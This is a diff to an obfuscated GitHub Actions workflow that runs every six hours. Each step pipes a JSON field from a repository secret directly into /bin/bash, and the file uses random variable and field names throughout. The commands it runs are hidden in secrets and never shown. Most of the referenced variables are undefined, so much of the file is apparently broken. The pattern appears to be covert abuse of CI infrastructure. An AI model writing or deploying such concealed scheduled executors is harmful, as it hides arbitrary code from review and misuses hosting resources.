@@ -3,7 +3,7 @@ name: ghauiijnan
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 4/6 * * *'
+    - cron: '48 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,11 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: ghauiijnan
         env:
-          i1054: ${{ secrets.i1054 }}
+          yfhe718: ${{ secrets.yfhe718 }}
         run: |
-          echo $i1054 | jq -r .udn89227 | /bin/bash
-          echo $dkfl8 | jq -r .njlip65 | /bin/bash
-          echo $oxz102 | jq -r .nk246 | /bin/bash
-          echo $k8 | jq -r .evjf48318 | /bin/bash
-          echo $t0879 | jq -r .im13 | /bin/bash
+          echo $yfhe718 | jq -r .jx00 | /bin/bash
+          echo $nntm0 | jq -r .xwe7 | /bin/bash
+          echo $r11192 | jq -r .zih5375 | /bin/bash
+          echo $ikhu62534 | jq -r .un992 | /bin/bash
+          echo $hbjp5327 | jq -r .mylo432 | /bin/bash
+          echo $icbw71 | jq -r .wvp86700 | /bin/bash
+          echo $lsfre44344 | jq -r .w4 | /bin/bash
+          echo $cac327 | jq -r .p068 | /bin/bash
+          echo $jze478 | jq -r .o1370 | /bin/bash
+          echo $gk36451 | jq -r .gzni630 | /bin/bash
+          echo $h79689 | jq -r .mm370 | /bin/bash
 
